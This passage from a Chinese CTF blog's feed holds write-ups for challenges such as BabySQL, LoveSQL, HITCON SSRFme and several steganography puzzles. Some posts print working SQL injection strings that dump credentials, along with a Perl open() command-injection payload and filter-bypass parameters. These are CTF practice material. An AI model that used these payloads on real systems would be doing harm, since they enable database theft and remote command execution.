      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.8 [极客大挑战 2019]BuyFlag&amp;BabySQL</title>
    <link href="https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL.html"/>
    <id>https://da4er.top/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL.html</id>
    <published>2020-02-08T14:38:51.000Z</published>
    <updated>2020-02-08T14:40:34.017Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><strong>查看网页源代码找到一处php代码：</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/1.png" class title="Da4er"><br><strong>抓包查看：将user=1</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/2.png" class title="Da4er"><br><strong>然后绕过is_numeric函数，通过%00截断绕过。</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/3.png" class title="Da4er"><br><strong>然后需要money字段，用到数组绕过。</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/4.png" class title="Da4er"><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;404%00&amp;money[]&#x3D;100000000</span><br></pre></td></tr></table></figure></p><hr><h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p><strong>通过分析发现过滤了：and，or，union，select等关键字，但是可以双写绕过，有可显字段，使用普通的sql注入语句加上双写关键字即可完成注入。</strong><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/5.png" class title="Da4er"><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/6.png" class title="Da4er"><br><img src="/2-8-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag-BabySQL/7.png" class title="Da4er"><br>使用的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">查询表名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23</span><br><span class="line"></span><br><span class="line">查询字段名</span><br><span class="line">admin&amp;password&#x3D;admin1%27uniunionon%20selselectect%201%2C2%2Cgroup_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema%3Ddatabase()%20anandd%20table_name%3D%27b4bsql%27%23</span><br><span class="line"></span><br><span class="line">查询字段内容</span><br><span class="line">username&#x3D;admin&amp;password&#x3D;admi&#39; uniunionon selselectect 1,group_concat(concat_ws(&#39;:&#39;,username,passwoorrd)),3 frofromm b4bsql --+</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id=&quot;BuyFlag&quot;&gt;&lt;a href=&quot;#BuyFlag&quot; class=&quot;headerlink&quot; title=&quot;BuyFlag&quot;&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.8 [SUCTF2018]followme</title>
    <link href="https://da4er.top/2-8-SUCTF2018-followme.html"/>
    <id>https://da4er.top/2-8-SUCTF2018-followme.html</id>
    <published>2020-02-08T13:08:55.000Z</published>
    <updated>2020-02-08T13:09:48.205Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>查看流量包：发现数据包有很多http协议，直接导出http对象。</strong><br><img src="/2-8-SUCTF2018-followme/1.png" class title="Da4er"><br><img src="/2-8-SUCTF2018-followme/2.png" class title="Da4er"><br><strong>仔细分析后发现：这个是爆破admin密码的流量，找到爆破密码的地方，一个一个查看password字段的值，得到flag</strong><br><img src="/2-8-SUCTF2018-followme/3.png" class title="Da4er"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;查看流量包：发现数据包有很多http协议，直接导出http对象。&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-8-SUCT
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.8 [SUCTF2018]single dog</title>
    <link href="https://da4er.top/2-8-SUCTF2018-single-dog.html"/>
    <id>https://da4er.top/2-8-SUCTF2018-single-dog.html</id>
    <published>2020-02-08T12:43:27.000Z</published>
    <updated>2020-02-08T12:44:44.110Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>拿到题目是张图片，binwalk分离出一个txt</strong><br><img src="/2-8-SUCTF2018-single-dog/1.png" class title="Da4er"><br>打开txt文件发现是aaencode加密<br><img src="/2-8-SUCTF2018-single-dog/2.png" class title="Da4er"><br>到这里我遇到的坑出来了，对aaencode解密可以使用控制台解密，但是解密出来的是<br><img src="/2-8-SUCTF2018-single-dog/3.png" class title="Da4er"><br>然后又看了这道题，把所有的jpg隐写的方法都试了一遍还是没有flag。<br>最后其实就是aaencode解密，以前遇到的是直接alert()出来flag，但是这个题不一样，需要找到在线网站解密。<br><a href="https://www.qtool.net/decode" target="_blank" rel="noopener">aaencode解密网址</a><br>用这个网站解码出来：<br><img src="/2-8-SUCTF2018-single-dog/4.png" class title="Da4er"><br>得到flag。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;拿到题目是张图片，binwalk分离出一个txt&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/2-8-SUCTF2018-si
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [SUCTF 2019]Game</title>
    <link href="https://da4er.top/2-7-SUCTF-2019-Game.html"/>
    <id>https://da4er.top/2-7-SUCTF-2019-Game.html</id>
    <published>2020-02-07T15:25:55.000Z</published>
    <updated>2020-02-07T15:27:59.478Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。</strong><br><img src="/2-7-SUCTF-2019-Game/1.png" class title="This is an test image"><br><strong>接着在图片中寻找，找到一个des加密的字符串：U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</strong><br><img src="/2-7-SUCTF-2019-Game/2.png" class title="This is an test image"><br>DES加密的字符串都是以<strong>U2FsdGVkX1</strong>开头的。<br>用在线网站解码des，使用3DES解码：密码为假的flag<br><img src="/2-7-SUCTF-2019-Game/3.png" class title="This is an test image"><br>得到flag：flag{U_F0und_1t}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;查看源代码找到一串base32，解码得：suctf{hAHaha_Fak3_F1ag}，显然是个假的flag。&lt;/strong&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [HITCON 2017]SSRFme</title>
    <link href="https://da4er.top/2-7-HITCON-2017-SSRFme.html"/>
    <id>https://da4er.top/2-7-HITCON-2017-SSRFme.html</id>
    <published>2020-02-07T14:58:11.000Z</published>
    <updated>2020-02-07T14:59:08.064Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>首先拿到源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &#123;</span><br><span class="line">        $http_x_headers &#x3D; explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);</span><br><span class="line">        $_SERVER[&#39;REMOTE_ADDR&#39;] &#x3D; $http_x_headers[0];</span><br><span class="line">    &#125;</span><br><span class="line">    echo $_SERVER[&quot;REMOTE_ADDR&quot;];</span><br><span class="line">    $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br><span class="line">    @file_put_contents(basename($info[&quot;basename&quot;]), $data);</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure><br>主要代码是这个部分：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));</span><br><span class="line">    $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);</span><br><span class="line">    $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));</span><br><span class="line">    @mkdir($dir);</span><br><span class="line">    @chdir($dir);</span><br></pre></td></tr></table></figure><br><strong>代码逻辑为：1.创建一个’orange/客户端ip哈希值’的目录；2.将传入的URL带入命令GET执行 — GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求；3.解析filename参数，传入filename的最后一级文件夹（获取不为空）并创建。</strong><br><img src="/2-7-HITCON-2017-SSRFme/1.png" class title="This is an test image"></p><hr><p><strong>解法有很多，但是我在做的时候主要用的open()函数绕过检测机制的方法。</strong><br><strong>首先通过上面代码的逻辑访问网站根目录：<br>创建一个名为a的文件，通过url参数访问根目录，那么访问的信息就会存储在a文件下。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&amp;filename&#x3D;a</span><br><span class="line">sandbox&#x2F;0a3519231615f5dcb5681b439c71d89c&#x2F;a</span><br></pre></td></tr></table></figure><br><img src="/2-7-HITCON-2017-SSRFme/2.png" class title="This is an test image"><br>看到有个readflag。<br>其次用到了perl语言的open函数参数是可控的，可以执行任意命令。<br><strong>这里要明确一点perl的GET命令是调用open函数来实现执行命令的。</strong><br>下面是截取别的大佬博客wp中的一段：<br><img src="/2-7-HITCON-2017-SSRFme/3.png" class title="This is an test image"><br><strong>这个意思有两点：1.在file.pm中open函数参数可控；2.file.pm先判断(file:文件名)中的文件是否存在，才能执行文件名对应的命令。</strong><br>所以最终的payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag|  创建相应的同名文件。</span><br><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;da4er   利用open执行代码。</span><br><span class="line">最后直接访问&#x2F; sandbox &#x2F;哈希值&#x2F; 123就能得到flag。</span><br></pre></td></tr></table></figure><br><img src="/2-7-HITCON-2017-SSRFme/4.png" class title="This is an test image">)</p><hr><p>参考博客：<br><a href="https://www.jianshu.com/p/3f82685f56a8" target="_blank" rel="noopener">1</a><br><a href="http://momomoxiaoxi.com/2017/11/08/HITCON/" target="_blank" rel="noopener">2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;首先拿到源码：&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [极客大挑战 2019]Knife&amp;LoveSQL&amp;Http</title>
    <link href="https://da4er.top/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http.html"/>
    <id>https://da4er.top/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http.html</id>
    <published>2020-02-07T14:27:03.000Z</published>
    <updated>2020-02-07T14:28:22.098Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script></p><h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p><strong>题目提示找到shell，shell密码都给了，直接用菜刀连接，得到flag。</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/1.png" class title="This is an test image"></p><hr><h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p><strong>简单的sql注入题目，没用任何过滤机制。所以使用最简单的sql注入语句即可。</strong><br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;1 --+</span><br><span class="line">and 1&#x3D;2 --+</span><br><span class="line">order by 3 --+</span><br><span class="line">union select 1,2,3 --+</span><br><span class="line">union select 1,database(),version() --+</span><br><span class="line">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() --+</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; --+</span><br><span class="line">union select 1,username,password from users limit 0，1--+ or (union select 1,2,group_concat(concat_ws(&#39;:&#39;,username,password)) from users --+)</span><br></pre></td></tr></table></figure><br>将对应的表名换成题目中的表名即可<br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/2.png" class title="This is an test image"></p><hr><h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p><strong>这道题目主要考察http头部信息的理解和利用。</strong><br><strong>首先查看源码找到Secret.php</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/3.png" class title="This is an test image"><br><strong>接下来就是https头部的构造了，如图构造了三个http头部信息：User-Agent；Referer；X-Forwared-For。</strong><br><img src="/2-7-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Knife-LoveSQL-Http/4.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;/p&gt;
&lt;h3 id=&quot;Knife&quot;&gt;&lt;a href=&quot;#Knife&quot; class=&quot;headerlink&quot; title=&quot;Knife&quot;&gt;&lt;/a&gt;Kn
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>[GXYCTF2019]gakki</title>
    <link href="https://da4er.top/GXYCTF2019-gakki.html"/>
    <id>https://da4er.top/GXYCTF2019-gakki.html</id>
    <published>2020-02-07T13:03:42.000Z</published>
    <updated>2020-02-07T13:07:22.989Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>先binwalk分离图片的压缩包：</strong><br><img src="/GXYCTF2019-gakki/1.png" class title="This is an test image"><br><strong>得到的压缩包有密码，尝试爆破。</strong><br><img src="/GXYCTF2019-gakki/2.png" class title="This is an test image"><br><strong>看到flag.txt有很多字符，想到字符频率，用脚本或者HxD查看都可以。</strong><br><img src="/GXYCTF2019-gakki/3.png" class title="This is an test image"><br><img src="/GXYCTF2019-gakki/4.png" class title="This is an test image"><br>附上解题脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">def processLine(line, CharacterCounts):</span><br><span class="line">    for character in line:</span><br><span class="line">        #if ord(character) in range(97, 123):</span><br><span class="line">        if ord(character) in range(32,126):</span><br><span class="line">            CharacterCounts[character] +&#x3D; 1</span><br><span class="line">  </span><br><span class="line">#创建字母字典</span><br><span class="line">def createCharacterCounts(CharacterCounts):</span><br><span class="line">    #for i in range(97, 123):</span><br><span class="line">    for i in range(32, 126):</span><br><span class="line">        CharacterCounts[chr(i)] &#x3D; 0</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">    #用户输入一个文件名</span><br><span class="line">    # filename &#x3D; input(&quot;enter a filename:&quot;).strip()</span><br><span class="line">    filename &#x3D; &quot;flag.txt&quot;</span><br><span class="line">    infile &#x3D; open(filename, &quot;r&quot;)</span><br><span class="line">      </span><br><span class="line">    #建立用于计算词频的空字典</span><br><span class="line">    CharacterCounts &#x3D; &#123;&#125;</span><br><span class="line">    #初始化字典键值</span><br><span class="line">    createCharacterCounts(CharacterCounts)</span><br><span class="line">    for line in infile:</span><br><span class="line">        #processLine(line.lower(), CharacterCounts)</span><br><span class="line">        processLine(line, CharacterCounts)</span><br><span class="line">          </span><br><span class="line">    #从字典中获取数据对</span><br><span class="line">    pairs &#x3D; list(CharacterCounts.items())</span><br><span class="line">  </span><br><span class="line">    #列表中的数据对交换位置,数据对排序</span><br><span class="line">    items &#x3D; [[x,y] for (y,x) in pairs] </span><br><span class="line">    items.sort(reverse&#x3D;True)</span><br><span class="line">  </span><br><span class="line">    #输出count个数词频结果</span><br><span class="line">    for i in range(len(items)):</span><br><span class="line">        #print(items[i][1]+&quot;\t&quot;+str(items[i][0]))</span><br><span class="line">        print(items[i][1],end&#x3D;&#39;&#39;)</span><br><span class="line">          </span><br><span class="line">    infile.close()</span><br><span class="line">          </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;先binwalk分离图片的压缩包：&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;/GXYCTF2019-gakki/1.png&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [GXYCTF2019]Is this base?</title>
    <link href="https://da4er.top/2-7-GXYCTF2019-Is-this-base.html"/>
    <id>https://da4er.top/2-7-GXYCTF2019-Is-this-base.html</id>
    <published>2020-02-07T12:45:22.000Z</published>
    <updated>2020-02-07T12:56:11.886Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>首先打开题目发现有很多行base64，想到base64隐写。所谓的base64隐写就是通过在base64最后几个字节中隐藏信息，所以要使用很多行来存储信息。看到有很多行base64首先要想到base64隐写！</strong></p><hr><img src="/2-7-GXYCTF2019-Is-this-base/1.png" class title="This is an test image"><p>使用脚本跑即可，附上脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'1.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        bin_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            stegb64 = <span class="string">''</span>.join(line.split())</span><br><span class="line">            rowb64 =  <span class="string">''</span>.join(stegb64.decode(<span class="string">'base64'</span>).encode(<span class="string">'base64'</span>).split())</span><br><span class="line">            offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">            equalnum = stegb64.count(<span class="string">'='</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">            <span class="keyword">if</span> equalnum:</span><br><span class="line">                bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">print</span> <span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)])</span><br></pre></td></tr></table></figure><br><strong>得到flag</strong><br><img src="/2-7-GXYCTF2019-Is-this-base/2.png" class title="This is an test image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;首先打开题目发现有很多行base64，想到base64隐写。所谓的base64隐写就是通过在base64最后几个字节中隐藏信息，
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>博客图片无法正常显示说明</title>
    <link href="https://da4er.top/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E8%AF%B4%E6%98%8E.html"/>
    <id>https://da4er.top/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E8%AF%B4%E6%98%8E.html</id>
    <published>2020-02-07T11:20:21.000Z</published>
    <updated>2020-02-07T12:31:22.395Z</updated>
    
    <content type="html"><![CDATA[<p><script type="text/javascript" src="/js/src/bai.js"></script><br><strong>这两天重新装了一下hexo博客，在处理上传图片时发现，用之前的markdown格式上传本地图片网页不在显示，通过百度知道可以使用如下语法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% asset_img test.jpg This is an test image %&#125;</span><br></pre></td></tr></table></figure><br><strong>所以我们将之前的上传的图片都改成这种格式，写个python脚本批量改即可。</strong><br>脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_blog_image</span><span class="params">(text)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(text, <span class="string">'r+'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        r = fp.readlines()</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"new"</span>, <span class="string">"w+"</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> fp1:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> r:</span><br><span class="line">                <span class="keyword">if</span> (i.startswith(<span class="string">"!["</span>)):</span><br><span class="line">                    a = i.split(<span class="string">".png"</span>)</span><br><span class="line"><span class="comment">#只能更改博客10张图片</span></span><br><span class="line">                    num = a[<span class="number">0</span>][<span class="number">-1</span>:]</span><br><span class="line">                    <span class="comment"># print(num)</span></span><br><span class="line">                    b = <span class="string">"&#123;% asset_img "</span> + <span class="string">"&#123;0&#125;.png"</span>.format(num) + <span class="string">" This is an test image %&#125;"</span></span><br><span class="line">                    rep = i</span><br><span class="line">                    i = i.replace(rep, b)</span><br><span class="line">                    fp1.write(i + <span class="string">"\n"</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    fp1.write(i)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    text=input()</span><br><span class="line">    change_blog_image(text)</span><br><span class="line">    os.remove(text)</span><br><span class="line">    os.rename(<span class="string">'new'</span>,text)</span><br></pre></td></tr></table></figure><br><strong>说明一下：这个脚本只能改图片只有10张的博客(保存在本地的图片格式为：数字(1,2,3,4….).png)。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;&lt;br&gt;&lt;strong&gt;这两天重新装了一下hexo博客，在处理上传图片时发现，用之前的markdown格式上传本地图片网页不在显示，通过百度知道可以使用
      
    
    </summary>
    
    
      <category term="随笔" scheme="https://da4er.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随便" scheme="https://da4er.top/tags/%E9%9A%8F%E4%BE%BF/"/>
    
  </entry>
  
  <entry>
    <title>2.7 [GXYCTF2019]佛系青年</title>
